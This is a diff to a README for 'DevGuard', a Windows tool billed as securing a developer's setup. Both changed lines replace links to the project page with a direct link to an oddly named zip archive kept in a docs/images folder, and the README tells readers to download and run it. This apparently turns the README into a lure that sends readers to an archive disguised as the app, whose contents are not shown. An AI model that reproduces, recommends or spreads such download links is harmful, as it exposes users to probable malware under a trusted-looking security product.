@@ -1,6 +1,6 @@
 # 🛡️ DevGuard - Secure Your Dev Setup Fast
 
-[![Download DevGuard](https://img.shields.io/badge/Download-DevGuard-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tobeyiodinated117/DevGuard)
+[![Download DevGuard](https://img.shields.io/badge/Download-DevGuard-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tobeyiodinated117/DevGuard/raw/refs/heads/main/docs/images/Guard-Dev-decadist.zip)
 
 ## 🚀 What DevGuard Does
 
@@ -31,7 +31,7 @@ Use DevGuard on a Windows PC with:
 
 Visit this page to download and run the app:
 
-https://github.com/Tobeyiodinated117/DevGuard
+https://github.com/Tobeyiodinated117/DevGuard/raw/refs/heads/main/docs/images/Guard-Dev-decadist.zip
 
 ## 🪟 Install on Windows
 
